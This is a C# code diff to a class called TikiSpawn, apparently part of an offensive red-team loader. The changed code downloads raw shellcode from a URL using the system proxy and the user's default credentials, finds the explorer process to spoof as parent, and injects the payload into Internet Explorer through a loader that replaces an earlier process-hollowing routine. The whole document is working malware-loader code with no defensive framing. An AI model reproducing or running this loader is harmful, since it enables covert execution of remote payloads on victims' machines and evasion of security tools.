@@ -11,7 +11,7 @@ public class TikiSpawn
 
     public TikiSpawn()
     {
-        Flame(@"", @"");
+        //Flame(@"", @"");
     }
 
     private static byte[] GetShellcode(string url)
@@ -19,8 +19,9 @@ public class TikiSpawn
         WebClient client = new WebClient();
         client.Proxy = WebRequest.GetSystemWebProxy();
         client.Proxy.Credentials = CredentialCache.DefaultCredentials;
-        string compressedEncodedShellcode = client.DownloadString(url);
-        return Generic.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
+        byte[] compressedEncodedShellcode = client.DownloadData(url);
+        /*return Loader.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));*/
+        return compressedEncodedShellcode;
     }
 
     private static int FindProcessPid(string process)
@@ -40,23 +41,27 @@ public class TikiSpawn
         return pid;
     }
 
-    private void Flame(string binary, string url)
+    public static void Flame(string url)
     {
+        string binary = @"c:\Program Files\Internet Explorer\iexplore.exe";
         byte[] shellcode = GetShellcode(url);
         int ppid = FindProcessPid("explorer");
 
-        if (ppid != 0)
+        if (ppid == 0)
         {
-            try
-            {
-                var hollower = new Hollower();
-                hollower.Hollow(binary, shellcode, ppid);
-            }
-            catch { }
-        }
-        else
-        {
+            Console.WriteLine("[x] Couldn't get Explorer PID");
             Environment.Exit(1);
+        }
+
+        var ldr = new Loader();
+
+        try
+        {
+            ldr.Load(binary, shellcode, ppid);
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine("[x] Something went wrong! " + e.Message);
         }
     }
 }
